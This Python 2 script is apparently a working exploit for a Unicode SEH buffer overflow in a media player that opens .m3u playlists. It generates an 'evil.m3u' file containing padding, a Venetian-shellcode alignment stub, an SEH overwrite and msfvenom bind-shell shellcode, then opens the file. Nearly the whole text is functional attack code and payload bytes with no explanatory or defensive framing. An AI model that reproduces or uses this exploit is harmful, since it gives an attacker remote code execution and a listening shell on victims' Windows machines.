#!/usr/bin/python -w

import os

filename="evil.m3u"

align = (
"\x55"                      #push EBP   
"\x71"                      #Venetian Padding
"\x58"                      #pop EAX
"\x71"                      #Venetian Padding
"\x05\x20\x11"              #add eax,0x11002000  \
"\x71"                      #Venetian Padding     |> +300
"\x2d\x17\x11"              #sub eax,0x11001700  /
"\x71"                      #Venetian Padding
"\x50"                      #push EAX
"\x71"                      #Venetian Padding
"\xC3")                     #RETN

total_buffer = 5000
nseh_offset = 536
#seh_offset = 532

# root@kali:~# msfvenom -p windows/shell_bind_tcp -e x86/unicode_upper -a x86 --platform windows BufferRegister=EAX -b '\x00' -f python
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/unicode_upper
# x86/unicode_upper succeeded with size 787 (iteration=0)
# x86/unicode_upper chosen with final size 787
# Payload size: 787 bytes
# Final size of python file: 3768 bytes



buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x51"
buf += "\x41\x54\x41\x58\x41\x5a\x41\x50\x55\x33\x51\x41\x44"
buf += "\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41"
buf += "\x51\x41\x49\x41\x51\x41\x50\x41\x35\x41\x41\x41\x50"
buf += "\x41\x5a\x31\x41\x49\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += "\x31\x41\x49\x41\x49\x41\x58\x41\x35\x38\x41\x41\x50"
buf += "\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
buf += "\x41\x49\x51\x49\x31\x31\x31\x31\x41\x49\x41\x4a\x51"
buf += "\x49\x31\x41\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42"
buf += "\x41\x42\x33\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b"
buf += "\x4c\x49\x58\x34\x42\x4d\x30\x4b\x50\x4b\x50\x33\x30"
buf += "\x34\x49\x49\x55\x4e\x51\x47\x50\x51\x54\x34\x4b\x42"
buf += "\x30\x30\x30\x44\x4b\x32\x32\x4c\x4c\x54\x4b\x32\x32"
buf += "\x4c\x54\x34\x4b\x34\x32\x4e\x48\x4c\x4f\x57\x47\x30"
buf += "\x4a\x4e\x46\x30\x31\x4b\x4f\x46\x4c\x4f\x4c\x33\x31"
buf += "\x33\x4c\x4c\x42\x4e\x4c\x4d\x50\x39\x31\x58\x4f\x4c"
buf += "\x4d\x4d\x31\x57\x57\x59\x52\x4a\x52\x31\x42\x32\x37"
buf += "\x34\x4b\x51\x42\x4e\x30\x54\x4b\x4f\x5a\x4f\x4c\x44"
buf += "\x4b\x50\x4c\x4e\x31\x52\x58\x59\x53\x30\x48\x4d\x31"
buf += "\x5a\x31\x32\x31\x54\x4b\x42\x39\x4d\x50\x4b\x51\x49"
buf += "\x43\x34\x4b\x31\x39\x4e\x38\x5a\x43\x4e\x5a\x4f\x59"
buf += "\x44\x4b\x50\x34\x34\x4b\x4d\x31\x48\x56\x30\x31\x4b"
buf += "\x4f\x36\x4c\x39\x31\x38\x4f\x4c\x4d\x4d\x31\x39\x37"
buf += "\x50\x38\x39\x50\x42\x55\x4b\x46\x4c\x43\x33\x4d\x4a"
buf += "\x58\x4f\x4b\x43\x4d\x4e\x44\x42\x55\x49\x54\x31\x48"
buf += "\x54\x4b\x30\x58\x4f\x34\x4b\x51\x49\x43\x51\x56\x44"
buf += "\x4b\x4c\x4c\x50\x4b\x34\x4b\x51\x48\x4d\x4c\x4b\x51"
buf += "\x48\x53\x34\x4b\x4d\x34\x54\x4b\x4b\x51\x38\x50\x35"
buf += "\x39\x50\x44\x4e\x44\x4e\x44\x31\x4b\x31\x4b\x43\x31"
buf += "\x52\x39\x51\x4a\x42\x31\x4b\x4f\x4b\x30\x31\x4f\x31"
buf += "\x4f\x31\x4a\x34\x4b\x4e\x32\x4a\x4b\x54\x4d\x51\x4d"
buf += "\x33\x38\x4e\x53\x4e\x52\x4d\x30\x4d\x30\x53\x38\x52"
buf += "\x57\x34\x33\x4f\x42\x31\x4f\x50\x54\x42\x48\x50\x4c"
buf += "\x52\x57\x4d\x56\x4b\x57\x4b\x4f\x39\x45\x58\x38\x54"
buf += "\x50\x4d\x31\x4b\x50\x4b\x50\x4e\x49\x49\x34\x52\x34"
buf += "\x30\x50\x32\x48\x4d\x59\x43\x50\x32\x4b\x4b\x50\x4b"
buf += "\x4f\x58\x55\x52\x4a\x4c\x48\x31\x49\x30\x50\x39\x52"
buf += "\x4b\x4d\x51\x30\x30\x50\x51\x30\x52\x30\x32\x48\x39"
buf += "\x5a\x4c\x4f\x59\x4f\x59\x50\x4b\x4f\x38\x55\x46\x37"
buf += "\x53\x38\x4b\x52\x4b\x50\x4c\x51\x51\x4c\x53\x59\x5a"
buf += "\x46\x42\x4a\x4c\x50\x50\x56\x50\x57\x51\x58\x48\x42"
buf += "\x49\x4b\x30\x37\x53\x37\x4b\x4f\x38\x55\x42\x37\x31"
buf += "\x58\x47\x47\x5a\x49\x4e\x58\x4b\x4f\x4b\x4f\x39\x45"
buf += "\x42\x37\x43\x38\x42\x54\x4a\x4c\x4f\x4b\x39\x51\x4b"
buf += "\x4f\x38\x55\x51\x47\x35\x47\x43\x38\x53\x45\x32\x4e"
buf += "\x30\x4d\x53\x31\x4b\x4f\x4a\x35\x33\x38\x33\x33\x42"
buf += "\x4d\x53\x34\x4b\x50\x45\x39\x4b\x33\x42\x37\x31\x47"
buf += "\x31\x47\x50\x31\x5a\x56\x52\x4a\x4c\x52\x31\x49\x31"
buf += "\x46\x4a\x42\x4b\x4d\x43\x36\x39\x37\x51\x34\x4f\x34"
buf += "\x4f\x4c\x4d\x31\x4d\x31\x34\x4d\x4f\x54\x4e\x44\x4e"
buf += "\x30\x39\x36\x4d\x30\x30\x44\x30\x54\x50\x50\x32\x36"
buf += "\x52\x36\x50\x56\x50\x46\x32\x36\x50\x4e\x50\x56\x30"
buf += "\x56\x42\x33\x50\x56\x42\x48\x52\x59\x48\x4c\x4f\x4f"
buf += "\x53\x56\x4b\x4f\x38\x55\x33\x59\x49\x50\x50\x4e\x51"
buf += "\x46\x50\x46\x4b\x4f\x50\x30\x32\x48\x4c\x48\x54\x47"
buf += "\x4d\x4d\x53\x30\x4b\x4f\x38\x55\x47\x4b\x4c\x30\x56"
buf += "\x55\x56\x42\x32\x36\x32\x48\x47\x36\x44\x55\x57\x4d"
buf += "\x35\x4d\x4b\x4f\x4a\x35\x4f\x4c\x4d\x36\x53\x4c\x4b"
buf += "\x5a\x55\x30\x4b\x4b\x49\x50\x32\x55\x4d\x35\x47\x4b"
buf += "\x4f\x57\x4d\x43\x33\x42\x52\x4f\x51\x5a\x4b\x50\x32"
buf += "\x33\x4b\x4f\x48\x55\x41\x41"

junk1 = "\x90" * nseh_offset
nseh = "\x41\x71" 
#seh = "\xcb\x4b" # 0x004b00cb - old SEH - pop,pop, ret
seh = "\xf2\x41" # 0x004100f2 - pop,pop, ret 4
nop_sled = "\x58" * (117)

#seh = "\x43" * 2 + "\x44" * 2
junk2 = align + nop_sled + buf + "\x90" * (total_buffer - len(nseh) - len(seh) -len(align) - len(nop_sled) - len(buf))

payload = junk1 + nseh + seh + junk2

textfile = open(filename , 'w')
textfile.write(payload)
textfile.close()

os.startfile('Z:\\quickzip\\trilogic\\evil.m3u')

print len(junk2)
print len(payload)
print (total_buffer - len(nseh) - len(seh) -len(align) - len(nop_sled))